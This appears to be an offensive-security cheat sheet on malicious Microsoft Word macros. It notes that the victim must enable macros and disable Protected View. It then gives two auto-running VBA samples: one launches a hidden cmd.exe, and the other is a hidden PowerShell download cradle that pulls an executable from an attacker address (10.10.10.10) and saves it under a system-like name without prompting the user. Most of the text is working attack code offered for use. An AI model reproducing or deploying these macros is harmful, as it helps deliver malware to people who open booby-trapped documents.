# Word

In order for any of the code below to execute, the user has to enable Macros and disable Protected View after opening the malicious document. This needs to be done for any new document that is opened. In addition, this will only work in Macro-Enabled formats such as .doc (Word 97-2003 Document) or .docm, whereas newer formats such as .docx will not store macros.

## VBA Application Launcher

We can launch applications outside of VBA with the "Shell" function. The function takes two arguments, first, the application to launch, and second, the "WindowStyle" of the launched application. We can use the "vbHide" or "0" value to launch a hidden application. Note, the application may not open in a window, however, it is visible as a child process with any process viewer/explorer utility such as procexp/64 from sysinternals.

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

## VBA PowerShell Download Cradle

The code below will run the PowerShell command in a hidden PowerShell window, download the file and save it without any prompts to the user.

If an output path isn't specified, PowerShell will attempt to save the downloaded file in the same location as the Word document.

```vba
Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

Sub mymacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/winout64.exe', 'winsysx64.exe')"
    Shell str, 0
End Sub
```





